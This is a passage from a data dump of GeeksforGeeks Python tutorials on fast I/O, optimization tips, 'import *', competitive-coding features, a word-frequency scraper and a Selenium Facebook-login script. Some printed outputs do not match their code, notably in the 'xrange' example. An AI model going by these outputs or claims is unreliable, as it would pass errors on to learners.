begins#####################################\u00a0# import libraries for input/ output handling# on generic levelimport atexit, io, sys\u00a0# A stream implementation using an in-memory bytes# buffer. It inherits BufferedIOBase.buffer = io.BytesIO()sys.stdout = buffer\u00a0# print via here@atexit.registerdef write():\u00a0\u00a0\u00a0\u00a0sys.stdout.write(buffer.getvalue())\u00a0###################################### template ends\u00a0# normal method followed# input Nn = int(input())\u00a0# input the arrayarr = [int(x) for x in input().split()]\u00a0# initialize variablesummation = 0\u00a0# calculate sumfor x in arr:\u00a0\u00a0\u00a0\u00a0summation += x\u00a0# print answerprint(summation)While handling a large amount of data usually, the normal method fails to execute within the time limit. Method 2 helps in maintaining a large amount of I/O data. Method 3 is the fastest. Usually, handling of input data files greater than 2 or 3 MBs is helped via methods 2 and 3.Note: above mention codes are in Python 2.7, to use in Python 3.X versions. Simply replace the raw_input() with Python 3.X\u2019s input() syntax. Rest should work fine.References:\u00a01.More About Input in Python 2.7\u00a02.Output via sys library and other commands.\u00a03.Input via sys library and other commands.\u00a04. Python atexit Module docs.This article is contributed by Shubham Saxena. If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "6d0e2baed63348341a28e035640f44cd",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "In this article, some interesting optimization tips for Faster Python Code are discussed. These techniques help to produce result faster in a python code.Use builtin functions and libraries: Builtin functions like map() are implemented in C code. So the interpreter doesn\u2019t have to execute the loop, this gives a considerable speedup.The map() function applies a function to every member of iterable and returns the result. If there are multiple arguments, map() returns a list consisting of tuples containing the corresponding items from all iterables.# Python program to illustrate library functions# save time while coding with the example of map()import time\u00a0\u00a0\u00a0# slower (Without map())start = time.clock()\u00a0s = 'geeks'U = []for c in s:\u00a0\u00a0\u00a0\u00a0U.append(c.upper())print (U)elapsed = time.clock()e1 = elapsed - startprint (\"Time spent in function is: \", e1)\u00a0\u00a0\u00a0# Faster (Uses builtin function map())s = 'geeks'start = time.clock()\u00a0U = map(str.upper, s)\u00a0print (U)elapsed = time.clock()e2 = elapsed - startprint (\"Time spent in builtin function is: \", e2)Output:\r\n['G', 'E', 'E', 'K', 'S']\r\nTime spent in function is:  0.0394747945637\r\n['G', 'E', 'E', 'K', 'S']\r\nTime spent in builtin function is:  0.0212335531192\r\n\r\nThe packages are platform-specific, which means that we need the appropriate package for the platform we\u2019re using. If we are doing string operation, consider using an existing module \u2018collections\u2019 like deque which is highly optimized for our purposes.# Python program to illustrate# importing list-like container with\u00a0# fast appends and pops on either endfrom collections import deques = 'geek'\u00a0\u00a0\u00a0# make a new dequed = deque(s)\u00a0\u00a0\u00a0# add a new entry to the right sided.append('y')\u00a0\u00a0\u00a0# add a new entry to the left sided.appendleft('h')\u00a0print (d)\u00a0\u00a0\u00a0d.pop() # return and remove the rightmost item\u00a0\u00a0\u00a0d.popleft() # return and remove the lefttmost item\u00a0\u00a0\u00a0# print list deque in reverseprint (list(reversed(d)))\u00a0Output:deque(['h', 'g', 'e', 'e', 'k', 'y'])\r\n['k', 'e', 'e', 'g']\r\n# importing iteration toolsimport itertoolsiter = itertools.permutations([1,2,3])print (list(iter))Output:\r\n[(1, 2, 3), (1, 3, 2), (2, 1, 3), (2, 3, 1), (3, 1, 2), (3, 2, 1)]\r\nUse keys for sorts: In Python, we should use the key argument to the built-in sort instead, which is a faster way to sort.# Python program to illustrate# using keys for sortingsomelist = [1, -3, 6, 11, 5]somelist.sort()print (somelist)\u00a0\u00a0s = 'geeks'# use sorted() if you don't want to sort in-place:s = sorted(s)print (s)Output:\r\n[-3, 1, 5, 6, 11]\r\n['e', 'e', 'g', 'k', 's']\r\nIn each case the list is sorted according to the index you select as part of the key argument. This approach works just as well with strings as it does with numbers.Optimizing loops: Write idiomatic code: This may sound counter-intuitive but writing idiomatic code will make your code faster in most cases. This is because Python was designed to have only one obvious/correct way to do a task.For example (String Concatenation):# Python program to illustrate using# optimized loops for faster coding\u00a0\u00a0# slow O(n^2) - ( Note: In latest implementations it is O(n) )s = 'hellogeeks'slist = ''for i in s:\u00a0\u00a0\u00a0\u00a0slist = slist + iprint (slist)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# string concatenation (idiomatic and fast O(n))st = 'hellogeeks'slist = ''.join([i for i in s])print (slist)\u00a0\u00a0# Better way to iterate a rangeevens = [ i for i in range(10) if i%2 == 0]print (evens)\u00a0\u00a0# Less fasteri = 0evens = []while i < 10:\u00a0\u00a0\u00a0\u00a0if i %2 == 0:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0evens.append(i)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0i += 1\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print (evens)\u00a0\u00a0# slowv = 'for's = 'geeks ' + v + ' geeks'print (s)\u00a0\u00a0# fasts = 'geeks %s geeks' % vprint (s)\u00a0\u00a0\u00a0\u00a0Output:\r\nhellogeeks\r\n[0, 2, 4, 6, 8]\r\ngeeks for geeks\r\nEvery time running a loop to s(i), Python evaluates the method. However, if you place the evaluation in a variable, the value is already known and Python can perform tasks faster.Try multiple coding approaches: Using precisely the same coding approach every time we create an application will almost certainly result in some situations where the application runs slower than it might.For example (Initializing Dictionary Elements):# Python program to illustrate trying# multiple coding approaches\u00a0# for getting faster result# slowermydict = {'g':1,'e':1,'e':1,'k':1}word = 'geeksforgeeks'for w in word:\u00a0\u00a0\u00a0\u00a0if w not in mydict:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0mydict[w] = 0\u00a0\u00a0\u00a0\u00a0mydict[w] += 1print (mydict)\u00a0\u00a0# fastermydict = {'g':1,'e':1,'e':1,'k':1}word = 'geeksforgeeks'for w in word:\u00a0\u00a0\u00a0\u00a0try:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0mydict[w] += 1\u00a0\u00a0\u00a0\u00a0except KeyError:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0mydict[w] = 1print (mydict)Output:\r\n{'e': 5, 'g': 3, 'f': 1, 'k': 3, 'o': 1, 's': 2, 'r': 1}\r\nThe output is the same in both cases. The only difference is how the output is obtained.Use xrange instead of range:range() \u2013 This returns a list of numbers created using range() function.xrange() \u2013 This function returns the generator object that can be used to display numbers only by looping. Only particular range is displayed on demand and hence called \u201clazy evaluation\u201d.# slowerx = [i for i in range(0,10,2)]print (x)\u00a0\u00a0# fasterx = [i for i in range(0,10,2)]print (x)Output:\r\n[1, 3, 5, 7, 9]\r\nThis could save you system memory because xrange() will only yield one integer element in a sequence at a time. Whereas range(), it gives you an entire list, which is unnecessary overhead for looping.Use Python multiple assignment to swap variables: This is elegant and faster in Python.# Python program to illustrate swapping# of a variable in one line\u00a0\u00a0\u00a0# slowerx = 2y = 5temp = xx = yy = tempprint (x,y)\u00a0\u00a0x,y = 3,5# fasterx, y = y, xprint (x,y)Output:\r\n5 2\r\n5 3\r\nUse local variable if possible: Python is faster retrieving a local variable than retrieving a global variable. That is, avoid the \u201cglobal\u201d keyword. So if you are going to access a method often (inside a loop) consider writing it to a variable.# Python program to illustrate trying# to use local variables to make code# run fasterclass Test:\u00a0\u00a0\u00a0\u00a0def func(self,x):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print (x+x)\u00a0\u00a0# Declaring variable that assigns class method objectObj = Test()mytest = Obj.func # Declaring local variablen = 2for i in range(n):\u00a0\u00a0\u00a0\u00a0mytest(i) # faster than Obj.func(i)Output:\r\n0\r\n2\r\nReferences:StackOverflowPython.orgThis article is contributed by Afzal Ansari. If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "b8549b98ba2a17e51ef40a74b68a88ed",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Using import * in python programs is considered a bad habit because this way you are polluting your namespace, the import * statement imports all the functions and classes into your own namespace, which may clash with the functions you define or functions of other libraries that you import. Also it becomes very difficult at some times to say from which library does a particular function came from. The risk of overriding the variables/functions etc always persist with the import * practice.Below are some points about why import * should not be used:Code ReadabilityIt is always remains a mystery what is imported and cannot be found easily from which module a certain thing was imported that result in low code readability.Polluting the namespace, import * imports all the functions and classes in your own namespace that may clash with the function and classes you define or function and classes of other libraries that you may import.Concrete possibility of hiding bugsTools like pyflakes can\u2019t be used to statically detect errors in the source code.All of this does not mean that using import * is always bad, if i had told you that there is nothing like import * thing on this universe you would have been craving for it. The only thing you should remember while using import * is that you should always use this carefully and with discipline maintained.Now lets dive into an example to see the problem in a more practical and easy to understand way.consider a package a that contains a function sum (a, b)# import the module a using import *\u00a0from a import *\u00a0\u00a0# define a function sumdef sum (x, y):\u00a0\u00a0\u00a0\u00a0return x + y\u00a0\u00a0print (sum (2, 6))the error with this code is that the sum function that we define overrides the sum function from the module \u2018a\u2019 that we imported and we don\u2019t even have any idea about it. also it becomes very difficult to identify which function is actually being called in case of large programs.Correct method:# import the module a as limport a as l\u00a0\u00a0def sum (x, y):\u00a0\u00a0\u00a0\u00a0return x + y\u00a0\u00a0# calls the self-defined sum functionprint (sum (2, 6))\u00a0\u00a0# calls the sum function defined in the module aprint (l.sum(2, 6))Coding this way increases code readability as well as it becomes easy to debug and there are almost zero chances that any conflict will occur.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "7a02c4c42865c198c9ec82e29bf612c4",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "When it comes to Product Based Companies, they need good coders and one needs to clear the Competitive Coding round in order to reach the interview rounds. Competitive coding is one such platform that will test your mental ability and speed at the same time.Who should read this?\n    Any programmer who still hasn't tried python for\n    Competitive Coding MUST give this article a read.\n    This should clear up any doubts one has before \n    shifting to python.No matter how comfortable\n    a programming language may seem to you right now\n    Python is bound to feel even better.\n    Python has a tendency of sticking to people\n    like a bad habit !!SPEED is a factor where python is second to none. The amount of code to be typed decreases drastically in comparison to conventional programming languages like C, C++, JAVA. Another most important point is that python arms its users with a wide variety of functionality, packages, and libraries that act as a supplement to the programmer\u2019s mental ability.\u00a0Ultimately the best thing about python is that it\u2019s very simple and we need not waste much time on trivial matters like input, output, etc. It helps shift our focus to the problem at hand.Here I\u2019m gonna list out some of my favorite features of Python which I\u2019m sure will encourage you to start trying python for Competitive Coding.\u00a0\u00a01.Variable Independence\u00a0Python doesn\u2019t require us to declare variables and their Data-Types before using them. This also gives us the flexibility of range as long as it\u2019s within reasonable limits of the Hardware i.e. no need to worry about integer and long integer. Type conversion is internally handled with flawless results.\u00a0Amazing Fact !!\n          For nested loops in python we can use the \n          same variable name in both inner and outer\n          for-loop variables without fear of \n          inconsistent data or any errors !!2.Common Functions like sorted, min, max, count, etc.\u00a0The min/max function helps us to find the minimum/maximum element from a list. The Sorted function allows us to sort a list and the count function helps us to count the number of occurrences of a particular element in a list.\u00a0The best thing is that we can rest assured that the python libraries use the best possible algorithms for each of the above operations. For example, the sorted function is a very special sorting algorithm called TIMSORT that has a worst-case time complexity of O(n log n) which is the best a sorting algorithm can offer.\u00a0Reference: Python sorting algorithmPython# Python code to demonstrate working of min(),# max(), sorted() and count()arr = [10, 76, 87, 45, 22, 87, 90, 87, 66, 84, 87]\u00a0print(\"Maximum = \",max(arr))print(\"Minimum = \",min(arr))print(\"The sorted array is = \",sorted(arr))print('Number of occurrences of 87 is = ',arr.count(87))Output:\u00a0('Maximum = ', 90)\n('Minimum = ', 10)\n('The sorted array is = ', [10, 22, 45, 66, 76, 84, 87, 87, 87, 87, 90])\n('Number of occurrences of 87 is = ', 4)3.Lists in python combine the best aspects of arrays and linked lists.\u00a0Python lists provide the unique functionality of deleting specific elements while keeping the memory locations in a contiguous manner. This feature renders the concept of Linked lists null and void. It\u2019s like a linked list on STEROIDS! Moreover, Insertions can be performed at any desired location.Python# Python code to demonstrate list operationsarr = [00, 11, 22, 33, 44, 55, 66, 77, 88, 99]\u00a0# deletion via index positiondel arr[5]print(arr)\u00a0# deletion via specifying particular elementarr.remove(22)print(arr)\u00a0# insertion at any arbitrary positionarr[-1] = \"A random number\"print(arr)\u00a0# concept of sub-listsk = arr[:2]print(k)Output:\u00a0[0, 11, 22, 33, 44, 66, 77, 88, 99]\n[0, 11, 33, 44, 66, 77, 88, 99]\n[0, 11, 33, 44, 66, 77, 88, 'A random number']\n[0, 11]4.Unique list operations \u2013 Backtracking, Sub-Lists.\u00a0In case we are not sure about the list size then we can use the index position of -1 to access the last element. Similarly, -2 can be used for the second last element and so on. Thus we can backtrack a list. Also, we don\u2019t have to specify any particular list size so it also works as a dynamic allocation array.\u00a0A specific portion of a list can be extracted without having to traverse the list as is seen in the above example. A very astonishing fact about lists is that they can hold different data types. Gone are the days where lists used to be a homogeneous collection of data elements!!Functions can return more than one value.\u00a0Typically functions in other programming languages can return only one value but in python, we can return more than one value!! as is seen in the following code snippet.\u00a0Recommended: Please try your approach on {IDE} first, before moving on to the solution.Python# Python code to demonstrate that a function# can easily return multiple values.def multi_return(*arr):\u00a0\u00a0\u00a0\u00a0k1 = arr[0]\u00a0\u00a0\u00a0\u00a0k2 = arr[1]\u00a0\u00a0\u00a0\u00a0return k1,k2\u00a0\u00a0\u00a0\u00a0\u00a0a,b = multi_return(11,22)print(a,' ',b)\u00a0a,b = multi_return(55,66,77,88,99)print(a,' ',b)Output:\u00a011   22\n55   665.A flexible number of arguments to a function.\u00a0Arguments to a function may be passed in the form of a list whose size may vary every time we need to call the function. In the above example, we first called the function with 2 arguments and then with 5 arguments!!\u00a0If else and for loops are much more User Friendly.\u00a0The if-else statement of python allows us to search for a particular element in a list without the need of traversing the entire list and checking each element.\u00a0Some programming languages have a concept of a for each loop which is slightly different from a for a loop. It allows us to traverse a list where the loop variable takes upon the list values one by one. Python incorporates each loop concept in the for loop itself.Python# Python code to demonstrate quick searching\u00a0arr = [1, 2, 3, 4, 5, 6, 7, 8, 9]\u00a0# searching made easyif 3 in arr:\u00a0\u00a0\u00a0\u00a0print(\"YES\")else:\u00a0\u00a0\u00a0\u00a0print(\"NO\")\u00a0#foreach loopfor i in arr:\u00a0\u00a0\u00a0\u00a0print(i,end = ' ')Output:\u00a0YES\n1 2 3 4 5 6 7 8 9 Code Indentation.\u00a0Python blocks of code are distinguished on the basis of their indentation. This provides better code readability and instills in us a good habit of indenting our code.Concept of Sets and Dictionaries.\u00a0A Set is an unordered collection data type that is iterable, mutable and has no duplicate elements. It\u2019s like a list that doesn\u2019t allow duplicate elements.\u00a0A dictionary is like a list whose values can be accessed by user-defined keys instead of conventional numeric index values.\u00a0Recommended: Please try your approach on {IDE} first, before moving on to the solution.Python# Python code to demonstrate use of dictionaries# and sets.a = {'a','b','c','d','e','a'}\u00a0# the second 'a' is dropped to avoid repetitionprint(a)\u00a0dict = {'Name': 'Zara', 'Age': 7, 'Class': 'First'}print(\"dict['Name']: \", dict['Name'])print(\"dict['Age']: \", dict['Age'])Output:\u00a0{'d', 'a', 'e', 'b', 'c'}\ndict['Name']:  Zara\ndict['Age']:  7Robust input statements.\u00a0In competitive coding, we are often required to take \u2018n\u2019 space-separated integers as input and preferably save them in a list/array. Python provides functionality to do it all in a single line of code.!!\u00a0Python3# Python code to demonstrate how to take space# separated inputs.arr = [int(a) for a in input().strip().split(' ')]\u00a0print(arr)My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "b408936d1c66150a97289c0419b69e9b",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Python is one such programming language that makes everything easier and straight forward. Anyone who has dabbled in python for Competitive Coding gets somewhat addicted to its many features. Here is a list of some of its cool features that I\u2019ve found most useful in a competitive coding environment.\u00a0The most_common function of the Counter Package.\u00a0This is probably the most useful function I\u2019ve ever used and its always at the back of my mind while writing any python code. This function analyses a list/string and helps to return the top n entities in the list/string according to their number of occurrences in descending order where n is a number that is specified by the programmer. The individual entities are returned along with their number of occurrences in a tuple which can easily be referred/printed as and when required.\u00a0Python# Code to find top 3 elements and their counts# using most_commonfrom collections import Counter\u00a0arr = [1, 3, 4, 1, 2, 1, 1, 3, 4, 3, 5, 1, 2, 5, 3, 4, 5]counter = Counter(arr)top_three = counter.most_common(3)print(top_three)Output:[(1, 5), (3, 4), (4, 3)]The output tuple clearly states that 1 has occurred 5 times, 3 has occurred 4 times, and 4 has occurred 3 times.The n-largest/n-smallest function of the heapq Package.\u00a0This function helps to return the top n smallest/largest elements in any lists and here again n is a number specified by the programmer.\u00a0Python# Python code to find 3 largest and 4 smallest# elements of a list.import heapq\u00a0grades = [110, 25, 38, 49, 20, 95, 33, 87, 80, 90]print(heapq.nlargest(3, grades))print(heapq.nsmallest(4, grades))Output:\u00a0[110, 95, 90]\n[20, 25, 33, 38]The first line of output gives 3 of the largest numbers present in the list grades. Similarly the second line of output prints out 4 of the smallest elements present in the list grades. Another speciality of this function is that it does not overlook repetitions. So in place of n if we were to place the length of the array the we would end up with the entire sorted array itself !!Dictionary and concept of zipping Dictionaries\u00a0Dictionaries in python are truly fascinating in terms of the unique functionality that they offer. They are stored as a Key and Value pair in the form of an array like structure. Each value can be accessed by its corresponding key.\u00a0The zip function is used to join two lists together or we can even join the key and value pairs in a dictionary together as a single list. The application of this concept will be made clear in the following code snippet.Python# Python code to demonstrate use of zip.import heapq\u00a0stocks = {\u00a0\u00a0\u00a0\u00a0'Goog' : 520.54,\u00a0\u00a0\u00a0\u00a0'FB' : 76.45,\u00a0\u00a0\u00a0\u00a0'yhoo' : 39.28,\u00a0\u00a0\u00a0\u00a0'AMZN' : 306.21,\u00a0\u00a0\u00a0\u00a0'APPL' : 99.76\u00a0\u00a0\u00a0\u00a0}\u00a0zipped_1 = zip(stocks.values(), stocks.keys())\u00a0# sorting according to valuesprint(sorted(zipped_1))\u00a0zipped_2 = zip(stocks.keys(), stocks.values())print(sorted(zipped_2))#sorting according to keysOutput:\u00a0[(39.28, 'yhoo'), (76.45, 'FB'), (99.76, 'APPL'), (306.21, 'AMZN'), (520.54, 'Goog')]\n[('AMZN', 306.21), ('APPL', 99.76), ('FB', 76.45), ('Goog', 520.54), ('yhoo', 39.28)]The Map function.\u00a0This function is a sneaky little shortcut that allows us to implement a simple function on a list of values in a very Unconventional Manner. The following example will give a simple application of this functionality. The function takes as parameters the function name and the name of the list the function needs to be applied upon.Python# Python code to apply a function on a listincome = [10, 30, 75]\u00a0def double_money(dollars):\u00a0\u00a0\u00a0\u00a0return dollars * 2\u00a0new_income = list(map(double_money, income))print(new_income)Output:\u00a0[20, 60, 150]Here, we just implemented a simple function which multiplies each list value by two and returns it as a new list.Concatenation of list of strings\u00a0Suppose we have been given a list of strings and we have to give the output by concatenating the list\u00a0Let\u2019s look at the previous code what we were doing:Pythonstring = \"\"lst = [\"Geeks\", \"for\", \"Geeks\"]for i in lst:\u00a0\u00a0\u00a0\u00a0string += iprint(string)This method of joining a list of strings is definitely not the best method because everytime a new string will be created\u00a0Pythonlst = [\"Geeks\", \"for\", \"Geeks\"]string = ''.join(lst)print(string)Using join() function is memory efficient as well as handy to write which definitely proves to be the advantages over the previous code.Individually these functions might look innocent but will definitely come in handy in a TIME LIMITED CODING ENVIRONMENT in the sense that they offer large functionality in a VERY short amount of code. The functionalities discussed have very specific applications and act like a SHORTCUT or a CHEAT-SHEET in competitive coding. Having these useful tricks up your sleeve might just give someone the COMPETITIVE EDGE that they were looking for !!This article is contributed by Siddhant Bajaj. If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "a2facf64ad708832e0d5dba4ff521c4b",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "The task is to count the most frequent words, which extracts data from dynamic sources.First, create a web crawler or scraper with the help of the requests module and a beautiful soup module, which will extract data from the web pages and store them in a list. There might be some undesired words or symbols (like special symbols, blank spaces), which can be filtered in order to ease the counts and get the desired results.\u00a0After counting each word, we also can have the count of most (say 10 or 20) frequent words.Modules and Library functions used :\u00a0requests : Will allow you to send HTTP/1.1 requests and many more.\u00a0beautifulsoup4 : Used for parsing HTML/XML to extract data out of HTML and XML files.\u00a0operator : Exports a set of efficient functions corresponding to the intrinsic operators.\u00a0collections : Implements high-performance container datatypes.Below is an implementation of the idea discussed above :\u00a0\u00a0Python3# Python3 program for a word frequency# counter after crawling/scraping a web-pageimport requestsfrom bs4 import BeautifulSoupimport operatorfrom collections import Counter\u00a0'''Function defining the web-crawler/corespider, which will fetch information froma given website, and push the contents tothe second\u00a0 function clean_wordlist()'''\u00a0\u00a0def start(url):\u00a0\u00a0\u00a0\u00a0\u00a0# empty list to store the contents of\u00a0\u00a0\u00a0\u00a0# the website fetched from our web-crawler\u00a0\u00a0\u00a0\u00a0wordlist = []\u00a0\u00a0\u00a0\u00a0source_code = requests.get(url).text\u00a0\u00a0\u00a0\u00a0\u00a0# BeautifulSoup object which will\u00a0\u00a0\u00a0\u00a0# ping the requested url for data\u00a0\u00a0\u00a0\u00a0soup = BeautifulSoup(source_code, 'html.parser')\u00a0\u00a0\u00a0\u00a0\u00a0# Text in given web-page is stored under\u00a0\u00a0\u00a0\u00a0# the <div> tags with class <entry-content>\u00a0\u00a0\u00a0\u00a0for each_text in soup.findAll('div', {'class': 'entry-content'}):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0content = each_text.text\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# use split() to break the sentence into\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# words and convert them into lowercase\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0words = content.lower().split()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0for each_word in words:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0wordlist.append(each_word)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0clean_wordlist(wordlist)\u00a0# Function removes any unwanted symbols\u00a0\u00a0def clean_wordlist(wordlist):\u00a0\u00a0\u00a0\u00a0\u00a0clean_list = []\u00a0\u00a0\u00a0\u00a0for word in wordlist:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0symbols = \"!@#$%^&*()_-+={[}]|\\;:\\\"<>?/., \"\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0for i in range(len(symbols)):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0word = word.replace(symbols[i], '')\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if len(word) > 0:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0clean_list.append(word)\u00a0\u00a0\u00a0\u00a0create_dictionary(clean_list)\u00a0# Creates a dictionary containing each word's# count and top_20 occurring words\u00a0\u00a0def create_dictionary(clean_list):\u00a0\u00a0\u00a0\u00a0word_count = {}\u00a0\u00a0\u00a0\u00a0\u00a0for word in clean_list:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if word in word_count:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0word_count[word] += 1\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0word_count[word] = 1\u00a0\u00a0\u00a0\u00a0\u00a0''' To get the count of each word in\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0the crawled page -->\u00a0\u00a0\u00a0\u00a0\u00a0# operator.itemgetter() takes one\u00a0\u00a0\u00a0\u00a0# parameter either 1(denotes keys)\u00a0\u00a0\u00a0\u00a0# or 0 (denotes corresponding values)\u00a0\u00a0\u00a0\u00a0\u00a0for key, value in sorted(word_count.items(),\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0key = operator.itemgetter(1)):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print (\"% s : % s \" % (key, value))\u00a0\u00a0\u00a0\u00a0\u00a0<-- '''\u00a0\u00a0\u00a0\u00a0\u00a0c = Counter(word_count)\u00a0\u00a0\u00a0\u00a0\u00a0# returns the most occurring elements\u00a0\u00a0\u00a0\u00a0top = c.most_common(10)\u00a0\u00a0\u00a0\u00a0print(top)\u00a0\u00a0# Driver codeif __name__ == '__main__':\u00a0\u00a0\u00a0\u00a0url = \"https://www.geeksforgeeks.org/programming-language-choose/\"\u00a0\u00a0\u00a0\u00a0# starts crawling and prints output\u00a0\u00a0\u00a0\u00a0start(url)[('to', 10), ('in', 7), ('is', 6), ('language', 6), ('the', 5),\n ('programming', 5), ('a', 5), ('c', 5), ('you', 5), ('of', 4)]My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "42adde20c76201d295bc08f39f97a8c2",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Python scripting is one of the most intriguing and fascinating things to do meanwhile learning Python. Automation and controlling the browser is one of them.In this particular article, we will see how to log in to the Facebook account using Python and the power of selenium.Selenium automates and controls browsers and it\u2019s activity. We can code in our way to control browser tasks with the help of selenium. Primarily, it is for automating web applications for testing purposes, but is certainly not limited to just that. Boring web-based administration tasks can be automated as well. As you learn more it\u2019s so much fun to see things happening automatically and saving time in doing useless tasks again and again.We use selenium here to open the site of our requirement (in this case Facebook) and there we inspect elements across email box, password box, and login button to find the id of them.Using find_element_by_id() function provided by selenium module, we can find the required element (username box, password box, login button)Using send_keys() function, provided by selenium module, we will send the data into the box.Installing third party modules required\r\nSelenium \r\ngetpass\r\nAdditional Requirement : geckodriver for firefox and \r\n                         chromedriver for chrome\r\nImporting necessary modulesSelenium : to automate browserTime : to pause running of script for some seconds as browsers try to detect automation stuff if we input too fastTaking username and password as input from userUsing input() function and passing prompt message as argument.Opening browser and required websitewebdriver.Chrome() will open new window of chrome. We will save it\u2019s object in variable named driver.Now using get function we will open up the Facebook website.Finding element for sending data and Sending inputUse inspect element tool on the element of browser of which you want to find id. In this case we will inspect username box, password box, login button to find their id. And then use this id combining with selenium function find_element_by_id() to find it across web page and save it in variables for later use. Then by using send_keys() we will send data across the elements found previously.Closing the browserAfter all of the above steps we have to quit the session and will be achieved by using driver.quit().Note: Here driver is the name of variable you chose for webdriver.Chrome().Complete Code:from selenium import webdriverfrom time import sleepfrom webdriver_manager.chrome import ChromeDriverManagerfrom selenium.webdriver.chrome.options import Options\u00a0\u00a0\u00a0usr=input('Enter Email Id:')\u00a0pwd=input('Enter Password:')\u00a0\u00a0\u00a0driver = webdriver.Chrome(ChromeDriverManager().install())driver.get('https://www.facebook.com/')print (\"Opened facebook\")sleep(1)\u00a0\u00a0username_box = driver.find_element_by_id('email')username_box.send_keys(usr)print (\"Email Id entered\")sleep(1)\u00a0\u00a0password_box = driver.find_element_by_id('pass')password_box.send_keys(pwd)print (\"Password entered\")\u00a0\u00a0login_box = driver.find_element_by_id('loginbutton')login_box.click()\u00a0\u00a0print (\"Done\")input('Press anything to quit')driver.quit()print(\"Finished\")See how such a concise piece of code can automate things for you.Bonus:We can also enter the password without displaying it on screen, for security purpose. For that we have to include one more module called getpass. Now with just one change in input statement of the password we can input password without displaying it on screen.from getpass import getpasspwd = getpass('Enter Password:')\u00a0Getpass prompts the user for a password without echoing. Basically it lets you enter the password without showing it on the screen.Similarly you can also automate many other things like twitter login, 